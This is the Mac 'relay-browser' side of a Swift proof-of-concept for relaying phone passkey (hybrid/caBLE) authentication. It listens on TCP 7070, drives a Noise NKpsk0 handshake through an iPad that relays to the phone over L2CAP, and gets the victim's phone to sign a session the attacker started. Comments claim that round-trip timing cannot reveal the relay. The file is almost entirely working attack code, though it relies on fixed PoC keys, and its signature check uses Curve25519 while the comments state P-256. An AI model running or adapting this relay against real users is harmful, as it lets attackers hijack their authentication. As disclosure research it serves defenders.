//
//  main.swift
//  cable-relay-poc — RELAY-BROWSER role (runs on the Mac)
//
//  A command-line Swift tool. The Mac has NO Bluetooth role here. It:
//    1. Listens on TCP :7070 for the iPad collector.
//    2. Runs the NKpsk0 initiator side of the handshake (P-256/AES-GCM/SHA-256),
//       driving frames down the TCP bridge. The iPad relays them to the
//       phone over L2CAP and relays replies back.
//    3. On success, prints: a shared session key agreed with a phone it
//       has never seen on a radio, a valid assertion signature, and the
//       app-layer RTT — which is far too coarse to reveal the relay.
//
//  Build:
//    swiftc -O main.swift ../Shared/Protocol.swift ../Shared/Noise.swift \
//      ../Shared/Handshake.swift ../Shared/Crypter.swift ../Shared/CableP256.swift \
//      ../Shared/HKDFShim.swift ../Shared/NoiseBox.swift ../Shared/AxiomLog.swift \
//      ../Shared/AxiomConfig.swift -o relaybrowser
//  Run:
//    ./relaybrowser
//

import Foundation
import Network
import CryptoKit

final class RelayBrowser {
    private var listener: NWListener!
    private var conn: NWConnection?
    private var rxBuffer = Data()

    private var initiator: CableHandshake.Initiator!
    private var crypter: Crypter?
    private var probeSentAt: UInt64 = 0
    private var challenge = Data()
    private var sessionCount = 0

    init() {
        resetSession()
    }

    private func line(_ s: String) {
        print(s)
        let stripped = s.hasPrefix("[MAC] ") ? String(s.dropFirst(6)) : s
        AxiomLog.shared?.log(stripped)
    }

    private func resetSession() {
        initiator = CableHandshake.Initiator(
            psk: PoCKeys.psk,
            peerIdentity: PoCKeys.responderPublicX962)
        crypter = nil
        challenge = Data("session-\(UUID().uuidString)".utf8)
        probeSentAt = 0
        rxBuffer = Data()
    }

    func run() {
        let params = NWParameters.tcp
        listener = try! NWListener(using: params, on: 7070)
        listener.newConnectionHandler = { [weak self] c in self?.accept(c) }
        listener.start(queue: .main)
        let addrs = Self.localIPs()
        line("[MAC] relay-browser listening on :7070 — waiting for iPad collector")
        line("[MAC] Noise: NKpsk0 / P-256 / AES-256-GCM / SHA-256 (PXP-aligned)")
        for addr in addrs { line("[MAC]   -> enter \(addr) on the iPad") }
        RunLoop.main.run()
    }

    private func accept(_ c: NWConnection) {
        if let old = conn {
            old.cancel()
            line("[MAC] dropped previous connection")
        }
        sessionCount += 1
        resetSession()
        conn = c
        c.stateUpdateHandler = { [weak self] st in
            switch st {
            case .ready:
                self?.line("[MAC] collector connected (session \(self?.sessionCount ?? 0)); starting NKpsk0 ceremony across relay")
                self?.receive()
                self?.startHandshake()
            case .failed(let e):
                self?.line("[MAC] connection failed: \(e)")
                self?.conn = nil
                self?.line("[MAC] waiting for next connection…")
            default: break
            }
        }
        c.start(queue: .main)
    }

    private func send(_ msg: Message) {
        conn?.send(content: Frame.encode(msg.encoded()), completion: .contentProcessed { err in
            if let err { NSLog("[MAC] send error: %@", "\(err)") }
        })
    }

    private func receive() {
        conn?.receive(minimumIncompleteLength: 1, maximumLength: 65536) { [weak self] data, _, done, err in
            guard let self else { return }
            if let d = data, !d.isEmpty {
                self.rxBuffer.append(d)
                for frame in Frame.drain(&self.rxBuffer) { self.handle(frame) }
            }
            if done || err != nil {
                self.line("[MAC] bridge closed — waiting for next connection…")
                self.conn = nil
                return
            }
            self.receive()
        }
    }

    private func startHandshake() {
        let m1 = Data(initiator.buildInitialMessage())
        send(Message(type: .handshakeInit, body: m1))
        line("[MAC] -> handshakeInit (NKpsk0, \(m1.count) bytes, over relay)")
    }

    private func handle(_ frame: Data) {
        guard let msg = Message.decode(frame) else { return }
        switch msg.type {

        case .handshakeResp:
            line("[MAC] <- handshakeResp (\(msg.body?.count ?? 0) bytes)")
            guard let body = msg.body,
                  let result = initiator.processResponse([UInt8](body))
            else {
                line("[MAC] NKpsk0 handshake FAILED"); return
            }
            crypter = result.crypter
            line("[MAC] NKpsk0 complete; session key AGREED with phone seen only via relay")
            line("[MAC]   cipher: AES-256-GCM | curve: P-256 | hash: SHA-256")

            probeSentAt = nowMicros()
            send(Message(type: .proximityProbe, probeNonce: 1, tMicros: probeSentAt))

            guard let sealed = crypter?.encrypt([UInt8](challenge)) else {
                line("[MAC] encrypt failed"); return
            }
            send(Message(type: .assertionRequest, body: Data(sealed)))
            line("[MAC] -> assertionRequest (asking victim's phone to sign MY session)")

        case .proximityEcho:
            let rttMicros = nowMicros() - probeSentAt
            line(String(format: "[MAC] app-layer RTT = %.1f ms — cannot distinguish 1m from a cross-country relay", Double(rttMicros)/1000.0))

        case .assertionResponse:
            guard let c = crypter,
                  let sealed = msg.body,
                  let sig = c.decrypt([UInt8](sealed))
            else {
                line("[MAC] assertion decrypt failed"); return
            }
            let ok = verify(Data(sig), over: challenge)
            line("[MAC] <- assertionResponse; signature valid = \(ok)")
            line("[MAC] ===== RELAY COMPLETE: victim authenticated a session they never initiated =====")

        default: break
        }
    }

    static func localIPs() -> [String] {
        var addrs: [String] = []
        var ifaddr: UnsafeMutablePointer<ifaddrs>?
        guard getifaddrs(&ifaddr) == 0, let first = ifaddr else { return [] }
        defer { freeifaddrs(ifaddr) }
        for ptr in sequence(first: first, next: { $0.pointee.ifa_next }) {
            let sa = ptr.pointee.ifa_addr.pointee
            guard sa.sa_family == UInt8(AF_INET) else { continue }
            let name = String(cString: ptr.pointee.ifa_name)
            guard name.hasPrefix("en") else { continue }
            var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
            getnameinfo(ptr.pointee.ifa_addr, socklen_t(sa.sa_len),
                        &hostname, socklen_t(hostname.count), nil, 0, NI_NUMERICHOST)
            let ip = String(cString: hostname)
            if !ip.isEmpty { addrs.append(ip) }
        }
        return addrs
    }

    private func verify(_ blob: Data, over challenge: Data) -> Bool {
        guard blob.count == 96,
              let pub = try? Curve25519.Signing.PublicKey(rawRepresentation: blob.prefix(32))
        else { return false }
        let sig = blob.dropFirst(32)
        return pub.isValidSignature(sig, for: challenge)
    }
}

if let token = AxiomConfig.token as String?, !token.isEmpty {
    AxiomLog.setup(dataset: AxiomConfig.dataset, token: token, role: "mac-relay")
    print("[MAC] Axiom logging enabled (dataset: \(AxiomConfig.dataset))")
} else {
    print("[MAC] Axiom logging disabled (no token)")
}

let browser = RelayBrowser()
browser.run()
